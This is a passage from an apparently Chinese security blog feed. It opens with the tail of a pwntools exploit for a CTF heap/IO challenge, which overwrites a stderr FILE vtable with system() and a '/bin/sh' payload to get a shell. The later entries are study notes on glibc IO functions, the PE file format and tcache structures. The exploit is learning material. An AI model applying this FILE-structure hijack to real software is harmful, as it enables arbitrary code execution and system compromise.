class="string">&quot;puts&quot;</span>)</span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(<span class="built_in">puts</span>))</span><br><span class="line">def add(size,name):</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Input string Length: \n&quot;</span>,size)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Author name:\n&quot;</span>,name)</span><br><span class="line">def edit(name,con):</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;New Author name:\n&quot;</span>,name)</span><br><span class="line">    io.sendafter(<span class="string">&quot;New contents:\n&quot;</span>,con)</span><br><span class="line">def <span class="built_in">exit</span>():</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;4&#x27;</span>)</span><br><span class="line">_IO_2_1_stderr_=base+<span class="number">0x3c4540</span></span><br><span class="line">vtableadd =_IO_2_1_stderr_+<span class="number">216</span></span><br><span class="line">bss = base+<span class="number">0x3c3000</span>+<span class="number">0x2000</span></span><br><span class="line">bssbuf = base+<span class="number">0x3c3000</span>+<span class="number">0x2200</span></span><br><span class="line">sys = base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">add(b<span class="number">&#x27;152&#x27;</span>,<span class="number">8</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p64(vtableadd),p64(bss))</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">edit(b<span class="number">&#x27;</span>aaaaaaaa<span class="number">&#x27;</span>+p64(bss),<span class="number">12</span>*p64(sys))</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">payload = b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+<span class="number">4</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x1</span>)+p64(<span class="number">0x2</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)</span><br><span class="line">edit(b<span class="number">&#x27;</span>aaaaaaaa<span class="number">&#x27;</span>+p64(_IO_2_1_stderr_),payload)</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;</span>hh<span class="number">&#x27;</span>)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="疑难"><a href="#疑难" class="headerlink" title="疑难"></a>疑难</h2><p>本题有诸多待解决的问题，利用exit（）无法打通，感觉是因为在exit选项的时候标准输入和标准输出已关闭，但是感觉也可以通过重定向到stderr来解决，需要对文件流的函数执行流程有足够的理解才能完成此构造，未来有机会解决此问题。</p>
]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Advanced IO</title>
    <url>/2024/08/20/userpwn/%E5%85%B3%E4%BA%8EIO%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="genops-c"><a href="#genops-c" class="headerlink" title="genops.c"></a>genops.c</h1><blockquote>
<p>其中定义了许多公共子函数，为具体跳表函数的实现提供基础功能</p>
</blockquote>
<h2 id="int-IO-switch-to-get-mode-FILE-fp"><a href="#int-IO-switch-to-get-mode-FILE-fp" class="headerlink" title="int _IO_switch_to_get_mode (FILE *fp)"></a><code>int _IO_switch_to_get_mode (FILE *fp)</code></h2><blockquote>
<p>此函数在同一个文件描述符变为get模式时可用，也就是准备从文件想缓冲区写入东西时可用</p>
</blockquote>
<h1 id="fileops-c"><a href="#fileops-c" class="headerlink" title="fileops.c"></a>fileops.c</h1><blockquote>
<p>跳表函数的核心实现</p>
</blockquote>
<h2 id="int-IO-new-file-overflow-FILE-f-int-ch"><a href="#int-IO-new-file-overflow-FILE-f-int-ch" class="headerlink" title="int _IO_new_file_overflow (FILE *f, int ch)"></a><code>int _IO_new_file_overflow (FILE *f, int ch)</code></h2><blockquote>
<p>此函数用于刷新和维护输出缓冲区</p>
<p>流程：</p>
<p>1.错误检查</p>
<p>2.从读切换到write，或第一次write都会进入此分支</p>
<p>​	2.1 若没有缓冲区，则设置缓冲区</p>
<p>​	2.2 backup的处理，目前还没学过</p>
<p>​	2.3 调整读写缓冲区指针，基本思想为：将writeptr与writebase更新为readptr，防止readbase和readptr有数据未读取完成；将writeend更新为bufend，尽可能利用缓冲区；将readptr，readbase，readend放到同一个位置。（感觉这操纵有点迷，自己想维护readbase到readptr之间的数据，后面又将他们放到同一个位置，这不前后矛盾吗，可能由于版本迭代之后逻辑比较混乱）</p>
<p>​	2.4 调整flag，置为最近putting过</p>
<p>​	2.5 不是宽字符并且是行缓冲或无缓冲就将写缓冲区的end设置为ptr（不知道什么功能会用上）</p>
<p>3.通过判断ch参数来决定函数功能</p>
<p>​	3.1 ch &#x3D; eof，就是刷新缓冲区，将writebase到writeptr中的数据写入文件之中</p>
<p>​	3.2 缓冲区满了之后刷新缓冲区，第一次调用是不会走到这一步的</p>
<p>​	3.3 &amp; 3.4 将ch放入到缓冲区，该刷新的时候刷新，一个字符一个字符判断</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">int_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*错误检查*/</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">/*从读切换到write，或第一次write都会进入此分支*/</span></span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0							      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \</span></span><br><span class="line"><span class="meta">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \</span></span><br><span class="line"><span class="meta">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \</span></span><br><span class="line"><span class="meta">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure>

<h2 id="static-size-t-new-do-write-FILE-fp-const-char-data-size-t-to-do"><a href="#static-size-t-new-do-write-FILE-fp-const-char-data-size-t-to-do" class="headerlink" title="static size_t new_do_write (FILE *fp, const char *data, size_t to_do)"></a><code>static size_t new_do_write (FILE *fp, const char *data, size_t to_do)</code></h2><blockquote>
<p>1.通过判断readend和writebase来判断读操作是否成功，若不成功调整文件偏移，使写操作在正确位置。<br>2.调整_cur_column，格式化所需要，目前知道干什么的就行<br>3.更新写缓冲区的位置为整个缓冲区大小或0</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">注意：int</span></span><br><span class="line"><span class="comment">_IO_new_do_write (FILE *fp, const char *data, size_t to_do)</span></span><br><span class="line"><span class="comment">此函数使上述函数的核心实现，上述函数仅仅做了一个封装，成功返回0，不成功返回EOF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="size-t-IO-default-xsputn-FILE-f-const-void-data-size-t-n"><a href="#size-t-IO-default-xsputn-FILE-f-const-void-data-size-t-n" class="headerlink" title="size_t _IO_default_xsputn (FILE *f, const void *data, size_t n)"></a><code>size_t _IO_default_xsputn (FILE *f, const void *data, size_t n)</code></h2><blockquote>
<p>此函数用于读取不足一个缓冲区的字符向文件中，但是需要考虑行缓冲无缓冲等情况需要封装一个函数来进行</p>
<p>1.缓冲区不够直接通过overflow的方式直接传递，直接就需要考虑缓冲区刷新问题</p>
<p>2.缓冲区足够，先填满缓冲区，多出来的第一个按1的方式处理。</p>
<p>在f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end，若填不满缓冲区不会刷新，（这就是c语言说的缓冲区刷新时机的原理）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件结构</title>
    <url>/2024/08/26/windows/pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64">https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64</a></p>
<p><a href="https://www.cnblogs.com/Hekeats-L/p/17997054">https://www.cnblogs.com/Hekeats-L/p/17997054</a></p>
<p>《逆向工程核心原理》</p>
<p><a href="https://chatgpt.com/c/66dc593d-c970-8013-8cae-88fcd3d98948">https://chatgpt.com/c/66dc593d-c970-8013-8cae-88fcd3d98948</a></p>
<h2 id="DOS-HEADER"><a href="#DOS-HEADER" class="headerlink" title="DOS HEADER"></a>DOS HEADER</h2><blockquote>
<p>兼容老版本</p>
</blockquote>
<h2 id="DOS-STUB"><a href="#DOS-STUB" class="headerlink" title="DOS STUB"></a>DOS STUB</h2><p>DOS stub 是一种嵌入在 Windows 可执行文件（PE 文件）中的小程序，主要用于在 DOS 环境下运行这些文件时提供提示信息。它的主要作用可以概括为以下几点：</p>
<ol>
<li><p><strong>兼容性</strong>：在 16 位 DOS 系统中运行 32 位或 64 位的 Windows 可执行文件（PE 文件）时，DOS stub 提供一个简单的提示，告知用户此文件不能在 DOS 环境下运行。通常会显示类似于 <code>This program cannot be run in DOS mode</code> 的信息。</p>
</li>
<li><p><strong>历史原因</strong>：DOS stub 起源于早期的 Windows 系统，当时 Windows 是基于 DOS 系统开发的。为了兼容旧的 DOS 环境，Windows 的可执行文件保留了 DOS stub。虽然现代系统不再需要这种功能，但为了保持格式的一致性，DOS stub 依然被保留。</p>
</li>
<li><p><strong>最小化程序</strong>：在某些情况下，开发者可以自定义 DOS stub 的内容，甚至可以让它执行一些简单的功能。但通常情况下，DOS stub 仅仅是一个输出错误提示的占位符。</p>
</li>
</ol>
<p>典型的 DOS stub 是一个非常小的 16 位程序，占用几乎忽略不计的空间，作用也相当有限，主要用于历史兼容性。</p>
<h2 id="IMAGE-NT-HEADERS64"><a href="#IMAGE-NT-HEADERS64" class="headerlink" title="_IMAGE_NT_HEADERS64"></a>_IMAGE_NT_HEADERS64</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">  DWORD                   Signature;</span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure>

<h3 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h3><blockquote>
<p>个人理解类似于文件签名的东西（函数签名），用来区分文件的信息</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  WORD  Machine;</span><br><span class="line">  WORD  NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD  SizeOfOptionalHeader;</span><br><span class="line">  WORD  Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<h3 id="IMAGE-OPTIONAL-HEADER64"><a href="#IMAGE-OPTIONAL-HEADER64" class="headerlink" title="IMAGE_OPTIONAL_HEADER64"></a>IMAGE_OPTIONAL_HEADER64</h3><blockquote>
<p>和文件的执行信息有关，总体的内存分配以及入口点之类的信息,其中描述了一些个导入表，导出表加载的RVA</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;</span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  ULONGLONG            ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;</span><br><span class="line">  DWORD                FileAlignment;</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  ULONGLONG            SizeOfStackReserve;</span><br><span class="line">  ULONGLONG            SizeOfStackCommit;</span><br><span class="line">  ULONGLONG            SizeOfHeapReserve;</span><br><span class="line">  ULONGLONG            SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

<h2 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="_IMAGE_SECTION_HEADER"></a>_IMAGE_SECTION_HEADER</h2><blockquote>
<p>为下面结构体的数组组成，描述了每一个section的基本信息，主要描述了每一个节加载的虚拟地址也就是（RVA）。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;</span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>小插曲：文件偏移需虚拟地址的换算。</p>
</blockquote>
<p><img src="/img/mypic/windows/image-20240907220600172.png" alt="image-20240907220600172"></p>
<p><img src="/img/mypic/windows/image-20240907220617402.png" alt="image-20240907220617402"></p>
<h2 id="一些节（用section-header定位）"><a href="#一些节（用section-header定位）" class="headerlink" title="一些节（用section_header定位）"></a>一些节（用section_header定位）</h2><blockquote>
<p>下面学习的是节中的重要的数据结构</p>
</blockquote>
<h3 id="IMAGE-IMPORT-DESCRIPTOR（比较重要的部分，也是存放再section中的）"><a href="#IMAGE-IMPORT-DESCRIPTOR（比较重要的部分，也是存放再section中的）" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR（比较重要的部分，也是存放再section中的）"></a>IMAGE_IMPORT_DESCRIPTOR（比较重要的部分，也是存放再section中的）</h3><blockquote>
<p>类似于linux中的got表,可以通过optional header来定位，其中描述了其的RVA，先定位属于哪一个section，之后再根据与section rva的差值加上其文件偏移地址（point to raw data）来定位</p>
<p>一个descriptior描述的是一个动态动态链接库的导入函数的内容</p>
<p>INT存储的是导入函数名称的地址，每个占8字节（其中的值都是rva因此需要换算）</p>
<p>IAT存储的是导入函数的地址，但是一开始存放的和INT是一样的东西</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;</span><br><span class="line">        DWORD   OriginalFirstThunk;<span class="comment">//指向导入名称表（INT）</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;<span class="comment">//库名称</span></span><br><span class="line">    DWORD   FirstThunk;<span class="comment">//指向导入地址表（IAT）</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>直观图解</p>
</blockquote>
<p><img src="/img/mypic/windows/image-20240908000341512.png" alt="image-20240908000341512"></p>
<h3 id="struct-IMAGE-EXPORT-DIRECTORY"><a href="#struct-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="struct IMAGE_EXPORT_DIRECTORY"></a>struct IMAGE_EXPORT_DIRECTORY</h3><blockquote>
<p>一般在库中记录这函数的名称以及地址，结构如下：</p>
</blockquote>
<p><img src="/img/mypic/windows/image-20240908004842227.png" alt="image-20240908004842227"></p>
<p><img src="/img/mypic/com/image-20240908004857794.png" alt="image-20240908004857794"></p>
<blockquote>
<p>010editor比较方便，详细记录着每个函数的名称所在位置，以及地址</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240908004936344.png" alt="image-20240908004936344"></p>
<blockquote>
<p>总体函数查找流程为：1.查找nameadd，找到对应的name，然后几下相应的索引，从original中取值，将此值作为add的查找索引。</p>
</blockquote>
<h2 id="关于patchpe"><a href="#关于patchpe" class="headerlink" title="关于patchpe"></a>关于patchpe</h2>]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>关于tcache的一些基础概述</title>
    <url>/2024/08/10/userpwn/%E5%85%B3%E4%BA%8Etcache%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8E%A2%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="tcache相关结构体"><a href="#tcache相关结构体" class="headerlink" title="tcache相关结构体"></a>tcache相关结构体</h1><h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];<span class="comment">//数量统计</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//指针数组</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p>此结构体为每个线程一个的tcache的管理器，管理级别上类似于arena。详情看源码，此结构体会在调用malloc的时候初始化。初始值全0。</p>
